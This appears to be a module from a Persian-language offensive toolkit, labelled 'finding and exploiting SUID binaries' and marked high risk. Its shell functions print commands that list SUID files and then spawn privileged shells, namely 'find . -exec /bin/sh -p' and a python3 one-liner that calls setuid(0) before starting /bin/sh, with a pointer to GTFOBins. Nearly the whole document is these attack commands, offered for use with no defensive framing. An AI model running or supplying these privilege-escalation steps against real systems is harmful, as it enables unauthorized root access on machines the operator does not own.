DESC="پیدا کردن و سوءاستفاده از باینری SUID"
REQ="shell"
RISK="HIGH"

termux(){ echo "find / -perm -4000 -type f 2>/dev/null"; }

kali(){
cat <<'EOF'
find / -perm -4000 -type f 2>/dev/null > suid.txt
cat suid.txt
# چک GTFOBins برای هر مورد:
# https://gtfobins.github.io/
# نمونه:
find . -exec /bin/sh -p \; -quit
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
EOF
}
